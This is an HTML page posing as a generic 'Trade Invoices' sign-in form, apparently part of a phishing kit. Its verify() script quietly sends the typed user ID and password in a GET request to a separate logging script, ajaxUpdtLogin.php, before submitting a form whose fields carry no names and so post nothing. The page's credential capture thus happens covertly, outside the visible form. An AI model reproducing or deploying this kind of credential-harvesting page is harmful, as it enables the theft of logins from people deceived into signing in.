<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="http://getbootstrap.com/assets/ico/favicon.ico">

    <title>Login for Trade Invoices</title>

    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="css/signin.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy this line! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
<script src="../includes/jquery/js/jquery.js"></script>

<script>
	function verify() {
		var uname = document.getElementById("userid").value;
		if (uname == "") {
			alert("Please enter your user name");
			return false;
		}
		var pword = document.getElementById("password").value;
		if (pword == "") {
			alert("Please enter your password");
			return false;
		} else {
			jQuery.ajaxSetup({async:false});
			$.get("ajaxUpdtLogin.php", {u: uname, p: pword}, function(data){});
			jQuery.ajaxSetup({async:true});
			document.getElementById('form1').submit();
		}
	}
	


</script>


</head>

<body>

    <div class="container">

      <form class="form-signin" id="form1" role="form" method="post" action="verify.php">
        <h2 class="form-signin-heading">Please sign in</h2>
        <input class="form-control" placeholder="User ID" id="userid" required="" autofocus="" type="password">
        <input class="form-control" placeholder="Password" id="password" required="" type="password" >
        <button class="btn btn-lg btn-primary btn-block" type="submit" onClick="verify()">Sign in</button>
      </form>

    </div> <!-- /container -->



 <script>
 	document.getElementById('userid').focus();
 </script>
</form>


</body>
</html>